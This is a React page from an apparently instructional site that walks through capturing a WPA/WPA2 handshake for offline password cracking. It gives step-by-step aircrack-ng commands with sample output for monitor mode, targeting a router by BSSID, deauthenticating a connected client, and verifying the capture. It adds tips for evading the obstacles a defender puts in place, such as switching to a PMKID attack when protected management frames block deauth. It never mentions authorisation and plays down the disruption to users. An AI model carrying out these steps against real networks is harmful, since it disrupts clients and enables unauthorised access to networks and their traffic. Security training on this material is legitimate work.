import React from 'react';
import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';

const CaptureHandshake = () => {
  return (
    <div className="page-content">
      <h1>Capturing the WPA/WPA2 Handshake</h1>

      <p>
        The <strong>4-Way Handshake</strong> is captured when a client connects (or reconnects) to a 
        WPA/WPA2 network. This capture file is everything you need to attempt cracking the password 
        offline — you never need to touch the network again after capturing it. Think of it like 
        photographing a lock: once you have the photo, you can study it at home and try keys at your 
        own pace.
      </p>

      {/* ============================================================ */}
      {/* SECTION: Two Methods                                         */}
      {/* ============================================================ */}
      <h2>📋 Two Capture Methods</h2>

      <Diagram title="Passive vs Active Capture">
{`
  ┌──────────────────────────────────┬──────────────────────────────────────┐
  │     METHOD 1: PASSIVE (Wait)    │    METHOD 2: ACTIVE (Deauth)        │
  ├──────────────────────────────────┼──────────────────────────────────────┤
  │                                  │                                      │
  │  1. Start capture on target      │  1. Start capture on target          │
  │  2. Wait... and wait...          │  2. Deauth a connected client        │
  │  3. Someone connects eventually  │  3. Client auto-reconnects (~1-5s)  │
  │  4. Handshake captured!          │  4. Handshake captured!              │
  │                                  │                                      │
  │  ✅ Completely stealthy          │  ✅ Fast and reliable                │
  │  ✅ No interference              │  ✅ Works in seconds                 │
  │  ❌ Could take hours/days        │  ⚠️ Brief disconnection for client  │
  │  ❌ Need someone to connect      │  ⚠️ Detectable by WIDS              │
  │                                  │  ❌ Need at least 1 client online    │
  └──────────────────────────────────┴──────────────────────────────────────┘
  
  Recommendation: Use Method 2 (Active) in most cases.
  The brief disconnection is barely noticeable to the user
  (their device reconnects automatically).
`}
      </Diagram>

      {/* ============================================================ */}
      {/* SECTION: Complete Walkthrough                                 */}
      {/* ============================================================ */}
      <h2>🖥️ Complete Step-by-Step Walkthrough</h2>

      <h3>Step 1: Enter Monitor Mode</h3>
      <Terminal lines={[
        { segments: [{ text: '# Kill interfering processes first', type: 'comment' }] },
        { segments: [{ text: '┌──(kali㉿kali)-[~]', type: 'prompt' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airmon-ng check kill', type: 'command' }] },
        { segments: [{ text: 'Killing these processes:', type: 'output' }] },
        { segments: [{ text: '  PID Name', type: 'output' }] },
        { segments: [{ text: '  890 wpa_supplicant', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Start monitor mode', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airmon-ng start wlan0', type: 'command' }] },
        { segments: [{ text: 'Monitor mode enabled on wlan0mon', type: 'highlight' }] },
      ]} />

      <h3>Step 2: Discover Target Network</h3>
      <Terminal lines={[
        { segments: [{ text: '# Scan all networks', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airodump-ng wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' CH  9 ][ Elapsed: 30 s ]', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' BSSID              PWR  Beacons  #Data  CH   ENC    CIPHER  AUTH  ESSID', type: 'output' }] },
        { segments: [{ text: ' AA:BB:CC:DD:EE:FF  -42  120      35     6    WPA2   CCMP    PSK   TargetNetwork', type: 'highlight' }] },
        { segments: [{ text: ' 11:22:33:44:55:66  -65  85       12     1    WPA2   CCMP    PSK   OtherNetwork', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' BSSID              STATION            PWR   Rate  Lost  Frames  Notes  Probes', type: 'output' }] },
        { segments: [{ text: ' AA:BB:CC:DD:EE:FF  CC:DD:EE:11:22:33  -35   54e-24  0   125', type: 'highlight' }] },
        { segments: [{ text: ' AA:BB:CC:DD:EE:FF  DD:EE:FF:44:55:66  -52   54e-11  0   47', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Note these THREE things:', type: 'comment' }] },
        { segments: [{ text: '# 1. BSSID: AA:BB:CC:DD:EE:FF (router MAC)', type: 'comment' }] },
        { segments: [{ text: '# 2. Channel: 6', type: 'comment' }] },
        { segments: [{ text: '# 3. STATION: CC:DD:EE:11:22:33 (a connected client)', type: 'comment' }] },
      ]} />

      <InfoBox type="note">
        <strong>Choosing the right client to deauth:</strong> Pick the client with the 
        <strong> strongest signal</strong> (least negative PWR). A client at -35 dBm is much better 
        than one at -75 dBm. The closer the client, the more reliably you'll capture the full 
        handshake. Also, prefer clients with high frame counts — they're actively using the network.
      </InfoBox>

      <h3>Step 3: Start Targeted Capture (Terminal 1)</h3>
      <Terminal lines={[
        { segments: [{ text: '# Lock onto the target AP and save to file', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write wpa_handshake wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' CH  6 ][ Elapsed: 15 s ]', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' BSSID              PWR  Beacons  #Data  CH  ENC    ESSID', type: 'output' }] },
        { segments: [{ text: ' AA:BB:CC:DD:EE:FF  -42  180      52     6   WPA2   TargetNetwork', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Keep this running! Don\'t close this terminal.', type: 'comment' }] },
        { segments: [{ text: '# Watch the top-right corner for "WPA handshake:"', type: 'comment' }] },
      ]} />

      <h3>Step 4: Deauthenticate a Client (Terminal 2)</h3>
      <Terminal lines={[
        { segments: [{ text: '# Open a NEW terminal for the deauth attack', type: 'comment' }] },
        { segments: [{ text: '# Send 4 deauth packets to specific client', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aireplay-ng --deauth 4 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:11:22:33 wlan0mon', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '15:30:45  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6', type: 'output' }] },
        { segments: [{ text: '15:30:45  Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:11:22:33]', type: 'output' }] },
        { segments: [{ text: '15:30:46  Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:11:22:33]', type: 'output' }] },
        { segments: [{ text: '15:30:47  Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:11:22:33]', type: 'output' }] },
        { segments: [{ text: '15:30:48  Sending 64 directed DeAuth (code 7). STMAC: [CC:DD:EE:11:22:33]', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# The client is now disconnected for ~2-5 seconds', type: 'comment' }] },
        { segments: [{ text: '# Their device will automatically reconnect', type: 'comment' }] },
        { segments: [{ text: '# During reconnection → handshake is captured!', type: 'comment' }] },
      ]} />

      <InfoBox type="warning">
        <strong>How many deauths?</strong> Don't send unlimited deauths (<code>--deauth 0</code>) 
        for WPA capture. You only need a brief disconnection — 2-5 packets is enough. If you send 
        too many, the client stays disconnected and can't reconnect to generate the handshake. 
        Send 4, wait 10 seconds, check if handshake was captured. If not, send 4 more.
      </InfoBox>

      <h3>Step 5: Verify Handshake Capture</h3>
      <p>
        Switch back to Terminal 1 (airodump-ng). Look at the <strong>top-right corner</strong> of the 
        display. When the handshake is captured, you'll see:
      </p>

      <Terminal lines={[
        { segments: [{ text: ' CH  6 ][ Elapsed: 1 min 30 s ][ ', type: 'output' }, { text: 'WPA handshake: AA:BB:CC:DD:EE:FF', type: 'highlight' }, { text: ' ]', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: ' BSSID              PWR  Beacons  #Data  CH  ENC    ESSID', type: 'output' }] },
        { segments: [{ text: ' AA:BB:CC:DD:EE:FF  -42  1200     285    6   WPA2   TargetNetwork', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# ★ "WPA handshake: AA:BB:CC:DD:EE:FF" appears!', type: 'comment' }] },
        { segments: [{ text: '# SUCCESS! Press Ctrl+C to stop capture.', type: 'comment' }] },
        { segments: [{ text: '# The handshake is saved in wpa_handshake-01.cap', type: 'comment' }] },
      ]} />

      <InfoBox type="success">
        <strong>Handshake captured!</strong> You now have everything needed to attempt cracking 
        the password offline. The file <code>wpa_handshake-01.cap</code> contains the handshake. 
        You can take this file to any powerful machine (desktop with GPU) and crack it there — 
        you don't need to be near the network anymore.
      </InfoBox>

      {/* ============================================================ */}
      {/* SECTION: Verify the Capture                                   */}
      {/* ============================================================ */}
      <h2>✅ Verifying the Capture File</h2>

      <p>
        Sometimes airodump-ng shows "WPA handshake" but the capture might be incomplete (missing 
        some of the 4 messages). Always verify:
      </p>

      <Terminal lines={[
        { segments: [{ text: '# Method 1: Use aircrack-ng to verify', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'sudo aircrack-ng wpa_handshake-01.cap', type: 'command' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '                              Aircrack-ng 1.7', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '   #  BSSID              ESSID                 Encryption   key', type: 'output' }] },
        { segments: [{ text: '   1  AA:BB:CC:DD:EE:FF  TargetNetwork         WPA (', type: 'output' }, { text: '1 handshake', type: 'highlight' }, { text: ')', type: 'output' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# "1 handshake" = GOOD! Capture is valid.', type: 'comment' }] },
        { segments: [{ text: '# "0 handshakes" = BAD — need to recapture', type: 'comment' }] },
        { segments: [{ text: '', type: 'output' }] },
        { segments: [{ text: '# Method 2: Use Wireshark to inspect', type: 'comment' }] },
        { segments: [{ text: '└─$ ', type: 'prompt' }, { text: 'wireshark wpa_handshake-01.cap', type: 'command' }] },
        { segments: [{ text: '# Filter: eapol', type: 'comment' }] },
        { segments: [{ text: '# You should see 4 EAPOL frames (the 4-way handshake)', type: 'comment' }] },
        { segments: [{ text: '# Minimum needed: Messages 1 & 2, or Messages 2 & 3', type: 'comment' }] },
      ]} />

      <Diagram title="What a Complete vs Incomplete Handshake Looks Like">
{`
  In Wireshark (filter: eapol):
  
  COMPLETE HANDSHAKE (all 4 messages):
  ┌────────────────────────────────────────────────────────────────┐
  │  No.  Time      Source              Dest                Info  │
  │  1    0.000     Router              Client              Key 1 │
  │  2    0.005     Client              Router              Key 2 │
  │  3    0.010     Router              Client              Key 3 │
  │  4    0.015     Client              Router              Key 4 │
  └────────────────────────────────────────────────────────────────┘
  ✅ All 4 messages — best quality capture
  
  PARTIAL BUT USABLE (messages 1+2 or 2+3):
  ┌────────────────────────────────────────────────────────────────┐
  │  No.  Time      Source              Dest                Info  │
  │  1    0.000     Router              Client              Key 1 │
  │  2    0.005     Client              Router              Key 2 │
  └────────────────────────────────────────────────────────────────┘
  ✅ Messages 1+2 are enough for cracking!
  
  UNUSABLE (only message 1 or only message 3):
  ┌────────────────────────────────────────────────────────────────┐
  │  No.  Time      Source              Dest                Info  │
  │  1    0.000     Router              Client              Key 1 │
  └────────────────────────────────────────────────────────────────┘
  ❌ Not enough — recapture needed
`}
      </Diagram>

      {/* ============================================================ */}
      {/* SECTION: Edge Cases                                          */}
      {/* ============================================================ */}
      <h2>⚠️ Edge Cases & Troubleshooting</h2>

      <h3>Edge Case: Handshake not captured after deauth</h3>
      <ul>
        <li><strong>Timing issue:</strong> Make sure airodump-ng was running BEFORE you sent deauth packets. If you start capture after deauth, you'll miss the handshake.</li>
        <li><strong>Too many deauths:</strong> If you sent <code>--deauth 0</code> (infinite), the client can't reconnect. Use <code>--deauth 4</code> and wait.</li>
        <li><strong>Client too far away:</strong> Weak signal means packets get lost. The handshake has 4 messages — if any are lost in transit, the capture fails.</li>
        <li><strong>Wrong channel:</strong> Make sure airodump-ng and aireplay-ng are on the same channel as the target.</li>
      </ul>

      <h3>Edge Case: No clients connected to the network</h3>
      <p>
        If nobody is connected, there's no one to deauth. You have three options:
      </p>
      <ul>
        <li><strong>Wait passively</strong> — Leave airodump-ng running and come back later. Someone will eventually connect.</li>
        <li><strong>PMKID attack</strong> — Some APs respond to a single association frame with a PMKID that can be cracked offline. No client needed!</li>
        <li><strong>Come back during busy hours</strong> — Early morning and evening when people are home.</li>
      </ul>

      <h3>Edge Case: Client reconnects to 5GHz instead of 2.4GHz</h3>
      <p>
        Modern dual-band routers often steer clients to 5GHz (better performance). If your adapter 
        only supports 2.4GHz, you won't see the reconnection. Solutions:
      </p>
      <ul>
        <li>Use a dual-band adapter that supports both 2.4GHz and 5GHz monitor mode</li>
        <li>Deauth on both bands simultaneously (requires two adapters)</li>
        <li>Target a client that's known to be on 2.4GHz (weaker signal, further from router)</li>
      </ul>

      <h3>Edge Case: "WPA handshake" appears but aircrack-ng says "0 handshakes"</h3>
      <p>
        This sometimes happens when airodump-ng detects a partial handshake. The notification 
        can be overly optimistic. Solution: re-deauth and try again. Make sure you're close 
        enough to capture all 4 messages clearly.
      </p>

      <h3>Edge Case: 802.11w (Protected Management Frames) enabled</h3>
      <p>
        If the network has 802.11w / PMF enabled, deauth frames will be rejected because 
        management frames are now authenticated. This is a defense against deauth attacks. 
        Your options are limited:
      </p>
      <ul>
        <li>Wait for a natural disconnection/reconnection</li>
        <li>Try the PMKID attack instead</li>
        <li>Target a different client or network</li>
      </ul>

      <InfoBox type="tip">
        <strong>Pro Tips for Reliable Capture:</strong>
        <ul>
          <li>Get physically closer to both the AP and the client</li>
          <li>Use a high-gain antenna for better reception</li>
          <li>Deauth the client with the strongest signal first</li>
          <li>If first deauth fails, wait 30 seconds and try again</li>
          <li>Keep airodump-ng running the entire time — never close it before the handshake appears</li>
          <li>Once captured, copy the .cap file to a safe location as backup</li>
        </ul>
      </InfoBox>

      <h2>📚 What's Next?</h2>
      <p>
        With the handshake captured, you need a <strong>wordlist</strong> — a file containing potential 
        passwords. The next section covers how to find, create, and optimize wordlists for maximum 
        cracking success.
      </p>
    </div>
  );
};

export default CaptureHandshake;
